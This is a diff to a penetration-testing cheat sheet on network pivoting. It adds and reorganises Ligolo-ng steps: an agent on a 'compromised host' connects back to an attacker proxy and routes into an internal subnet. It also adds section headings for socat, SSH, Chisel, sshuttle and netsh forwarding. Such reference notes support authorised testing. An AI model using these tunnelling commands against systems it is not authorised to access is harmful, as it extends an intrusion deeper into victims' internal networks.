@@ -1,3 +1,62 @@
+# Ligolo-ng (First Choice)
+
+## Ligolo-ng (Source, 0/5)
+```
+https://github.com/nicocha30/ligolo-ng/releases/
+```
+
+## Add Ligolo interface (1/5)
+```
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+```
+
+## Start Ligolo proxy on attacker (2/5)
+```
+./proxy -selfcert
+```
+
+## Connect Ligolo-ng agent from compromised host (3/5)
+Replace IP with that of the proxy.
+```bash
+./agent -connect 10.10.14.5:11601 -ignore-cert
+```
+
+
+## Start Ligolo-ng tunnel in proxy session (4/5)
+
+```bash
+session
+start
+```
+
+
+## Add route for Ligolo-ng tunnel (5/5)
+Replace the IP/subnet with that of the internal network that we're using the agent to pivot to. 
+```bash
+sudo ip route add 192.168.1.0/24 dev ligolo
+```
+
+## List Ligolo-ng sessions
+
+```bash
+session
+```
+
+## Stop Ligolo-ng tunnel
+
+```bash
+stop
+```
+
+
+## Add Ligolo Listener (for internal hosts to reach our external host through the pivot)
+```
+listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80
+```
+
+
+# Socat Port Forwarding
 ## Forward all traffic from port 80 to remote host using socat
 
 ```bash
@@ -16,6 +75,7 @@ socat TCP4-LISTEN:443,fork TCP:$IP:443
 socat TCP4-LISTEN:3389,fork TCP:$IP:3389
 ```
 
+# SSH Port Forwarding
 ## Create SSH local port forward
 
 ```bash
@@ -46,43 +106,7 @@ proxychains nmap -sT -Pn $IP
 echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf
 ```
 
-## Start Ligolo-ng proxy on attacker
-
-```bash
-./proxy -selfcert
-```
-
-## Connect Ligolo-ng agent from compromised host
-
-```bash
-./agent -connect 10.10.14.5:11601 -ignore-cert
-```
-
-## Start Ligolo-ng tunnel in proxy session
-
-```bash
-session
-start
-```
-
-## Add route for Ligolo-ng tunnel
-
-```bash
-ip route add 192.168.1.0/24 dev ligolo
-```
-
-## List Ligolo-ng sessions
-
-```bash
-session
-```
-
-## Stop Ligolo-ng tunnel
-
-```bash
-stop
-```
-
+# Chisel
 ## Create Chisel server on attacker
 
 ```bash
@@ -107,6 +131,7 @@ stop
 ./chisel client 10.10.14.5:8080 R:8082:localhost:3389
 ```
 
+# SShuttle
 ## Start sshuttle VPN tunnel
 
 ```bash
@@ -119,6 +144,7 @@ sshuttle -r user@$IP 192.168.1.0/24
 sshuttle -r user@$IP 192.168.1.0/24 --dns
 ```
 
+# Netsh
 ## Create netsh Windows port forward
 
 ```cmd
